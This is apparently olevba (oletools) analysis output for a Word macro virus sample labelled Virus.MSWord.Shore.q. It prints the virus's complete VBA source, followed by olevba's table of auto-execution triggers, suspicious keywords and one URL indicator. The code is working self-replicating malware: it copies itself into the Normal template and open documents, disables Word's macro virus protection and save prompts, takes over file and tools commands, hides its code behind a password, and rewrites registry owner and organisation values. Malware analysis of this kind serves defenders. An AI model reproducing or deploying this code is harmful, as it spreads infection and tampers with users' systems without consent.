olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.q-2596e71ac31f176b430afcb458c5ba99d4112a4b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.q-2596e71ac31f176b430afcb458c5ba99d4112a4b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sht.bas 
in file: Virus.MSWord.Shore.q-2596e71ac31f176b430afcb458c5ba99d4112a4b - OLE stream: 'Macros/VBA/Sht'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'Thanks to cyberHack, Astia, Marker, etc.
'I love ITS
'
'Public declaration
'
'
Public Const SeriesNumber = 990910
Public Const ModuleName = "Sht", mw = "Microsoft Word", _
        OFC = "Dj Computer Rental", _
        Peace = "Terima Kasih, LitTle_bUg", _
        SerNum$ = "Series Number", _
        pass = "Password : ", _
        badboy = "Want to be a bad boy....", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public Const mname = "LiTtlE_bUg", site = "http://rascal321.cjb.net", _
             isoft = "Bandung - 40131", hklm = "HKEY_LOCAL_MACHINE\", _
             hkcu = "HKEY_CURRENT_USER\", sm = "Software\Microsoft\", cv = "Windows\CurrentVersion\", ACME = "MS Setup (ACME)\User Info\"

Public Const msg = "Unable to get the access. Request aborted...", _
        aaa = "§·_n²__", bbb = "wenni", ccc = "sht0730", _
        abadacc = "Bad Access...", _
        code = "backbone240274", ddd = "junkies9908", eee = "Timor9909"

Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

'procedures in Offe module
Sub Buggy()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub

Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function

Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
    
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function

Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.codemodule
                .deletelines 1, .countoflines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub

Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
End Sub

Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub

Sub Copy2Normal()
Dim ATemp As Template
    Stealth
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).codemodule
        .deletelines 1, .countoflines
    End With
End Sub

Sub Copy2Document()
Dim Adoc As Document
    Stealth
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub

'infection procedures
Sub AutoOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("Copy2Document")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        act
        Copy2Normal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
    bday
    Stealth
    WordBasic.DisableAutoMacros True
    AnimateCaption
        
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        AutoOpen
        On Error Resume Next
        ActiveDocument.Saved = True
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    AnimateCaption
    Stealth
    On Error Resume Next
'    AutoOpen
    Copy2Document
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    bday
    act
    AnimateCaption
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    bday
    act
    AnimateCaption
    WordBasic.DisableAutoMacros True
    
    Copy2Document
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub

Sub InitDialog()
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
        
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    InitDialog
    Animated = False
    AnimateCaption
    Copy2Normal
    If getInfected(NormalTemplate) Then Copy2Document
    ModifyAttr NormalTemplate.FullName
    Buggy
    For Each Combar In Application.CommandBars
     
     
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    AnimateCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub fileNewDefault()
    AnimateCaption
    WordBasic.fileNewDefault
    Copy2Document
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        AnimateCaption
        Copy2Document
    End If
End Sub

Sub Stealth()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    On Error Resume Next
    ToolsOptionsDlg.Display
    AnimateCaption
    Stealth
End Sub

Sub NoAccess()
    a = MsgBox(msg, vbExclamation, abadacc)
    AnimateCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cruel = ccc + Mid(code, 9, 2)
    If LCase(InputBox(pass, badboy)) = cruel Then
        passDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    InitDialog
    ToolsMacrosDlg.Display
    AnimateCaption
End Sub

Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
'    CustomizationContext = NormalTemplate
    AnimateCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
    AnimateCaption
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
    AnimateCaption
End Sub

Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

Sub AnimateCaption()
    On Error Resume Next
    If Documents.Count > 0 Then WordBasic.viewpage
    If Animated Then Exit Sub
    anIntv = 0.5
    anPos = 0
    anCap = OFC
    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
    Animated = True
End Sub

Sub ScrollCaption()
    If Animated Then
        Application.Caption = Right$(anCap, anPos)
        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
        anPos = anPos + 1
    End If
    
    If anPos > Len(anCap) Then
        On Error Resume Next
        WordBasic.viewpage
        
        anPos = 0
        If anCap = OFC Then
            anCap = Peace
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = Peace Then
            anCap = mw
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = mw Then
            anCap = OFC
            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
            Animated = False
        End If
    End If
End Sub

Sub bday()
Dim msg As String, ent As String, quo As String
        ent = Chr$(13)
        quo = Chr$(34)
On Error Resume Next
    If Month(Now) = 10 And Day(Now) = 24 Then
        msg = "      SELAMAT ULANG TAHUN untuk Chd" & ent
        msg = msg & "     Semoga panjang umur dan sukses selalu." & ent
        msg = msg & "Untuk itu sebaiknya anda meliburkan diri hari ini" & ent
        msg = msg & "dan memberikan ucapan selamat juga untuk, " & quo & "Chd" & quo & "."
        msg = msg & ent & ent & "                        - Terimakasih -"
        msg = msg & ent & ".:: CrlShtVvMrtAchSnRsyDdStrBsyEdwAndDj ::. "
        MsgBox msg, 64, OFC
'        Application.OnTime Now + TimeSerial(0, 5, 0), "appexit"
        System.Cursor = 2
ElseIf Month(Now) = 7 And Day(Now) = 30 Then
        msg = "      SELAMAT ULANG TAHUN untuk Sht" & ent
        msg = msg & "     Semoga panjang umur dan sukses selalu." & ent
        msg = msg & "Untuk itu sebaiknya anda meliburkan diri hari ini" & ent
        msg = msg & "dan memberikan ucapan selamat juga untuk, " & quo & "Sht" & quo & "."
        msg = msg & ent & ent & "                        - Terimakasih -"
        msg = msg & ent & ".:: CrlShtVvMrtAchSnRsyDdStrBsyEdwAndDj ::. "
        MsgBox msg, 64, OFC
'        Application.OnTime Now + TimeSerial(0, 5, 0), "appexit"
        System.Cursor = 2
Else
    Exit Sub
End If
End Sub

Sub act()
On Error Resume Next
Dim org As String
    With System
        org = .PrivateProfileString("", hklm & sm & cv, "RegisteredOwner")
        If org <> mname Then
            .PrivateProfileString("", hkcu & "Control Panel\International\", "s1159") = "Shinta"
            .PrivateProfileString("", hkcu & "Control Panel\International\", "s2359") = "Shinta"
            .PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = OFC & "...."
            .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "footer") = OFC & " &u&b&d"
            .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "header") = mname & " &w&bPage &p of &P"
           .PrivateProfileString("", hklm & sm & cv, "OrgOwner") = org
           org = .PrivateProfileString("", hklm & sm & cv, "RegisteredOrganization")
           .PrivateProfileString("", hklm & sm & cv, "OrgOrganization") = org
           org = .PrivateProfileString("", hkcu & sm & ACME, "DefName")
           .PrivateProfileString("", hkcu & sm & ACME, "OrgName") = org
           org = .PrivateProfileString("", hkcu & sm & ACME, "DefCompany")
           .PrivateProfileString("", hkcu & sm & ACME, "OrgCompany") = org
           .PrivateProfileString("", hkcu & sm & ACME, "DefName") = Peace
           .PrivateProfileString("", hkcu & sm & ACME, "DefCompany") = mname
           .PrivateProfileString("", hklm & sm & cv, "RegisteredOwner") = mname
           .PrivateProfileString("", hklm & sm & cv, "RegisteredOrganization") = isoft
        End If
    End With
    With Application
        .UserName = mname
        .UserInitials = "Sht"
    End With
   Stealth
   With Dialogs(86)
        .Author = "Shinta Yulianti - LitTle_bUg"
        .Title = OFC
        .Subject = Peace
        .Comments = "This is not dangerous virus, please do not " & "delete or modify this macros. Thank you. "
        .Execute
    End With
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://rascal321.cjb|URL                                          |
|          |.net                |                                             |
+----------+--------------------+---------------------------------------------+
